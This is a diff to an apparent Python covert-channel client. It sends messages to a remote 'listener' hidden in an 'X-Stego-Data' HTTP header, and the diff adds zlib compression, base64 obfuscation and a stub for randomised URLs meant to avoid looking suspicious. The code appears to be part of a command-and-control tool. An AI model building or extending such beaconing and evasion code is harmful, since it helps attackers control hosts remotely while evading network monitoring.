@@ -12,26 +12,42 @@ import requests
 import base64
 import os
 import subprocess
+import zlib
 from utils import SERVER_IP, SERVER_PORT
 
 # Time in seconds to wait for a http response before a timeout occurs.
 # This time should be long, to give user ample time to input their commands into the listener. 
 REQUEST_TIMEOUT = 60
 # The URL of the listener
-SERVER_URL = f'http://{SERVER_IP}:{SERVER_PORT}'
+SERVER_ROOT_URL = f'http://{SERVER_IP}:{SERVER_PORT}'
 
-def send_and_receive_server(data: str):
+def get_random_url():
+    '''
+    Generate a randomised url to visit a page on the listener's webserver.
+    (because it'd look suspicious if the client kept requesting the exact same page)
+    '''
+    # TODO: insert code here
+    # For now, just return the root url.
+    return SERVER_ROOT_URL
+
+def send_and_receive_server(message: str):
     '''
     Encodes message and sends as HTTP request, then returns http response.
     '''
+    print(str(len(message.encode('utf-8'))) + " --> " + str(len(zlib.compress(message.encode('utf-8')))))
+    # Compress text
+    compressed_bytes = zlib.compress(message.encode('utf-8'))
+    # TODO: if compressed form is LARGER, send uncompressed form, and indicate so
+    # TODO: if empty string, don't compress/encode. just send empty string
     # Encode data into Base64 (obfuscates it, and also ensures all characters are valid to put inside http header)
-    encoded_data = base64.b64encode(data.encode('utf-8')).decode('utf-8')
+    encoded_message = base64.b64encode(compressed_bytes).decode('utf-8')
 
     # # Send the data as part of the HTTP header
     headers = {
-        'X-Stego-Data': encoded_data
+        'X-Stego-Data': encoded_message
     }
-    response = requests.get(SERVER_URL, headers=headers, timeout=REQUEST_TIMEOUT)
+    url = get_random_url()
+    response = requests.get(url, headers=headers, timeout=REQUEST_TIMEOUT)
     return response.text
 
 def process_input(input: str):
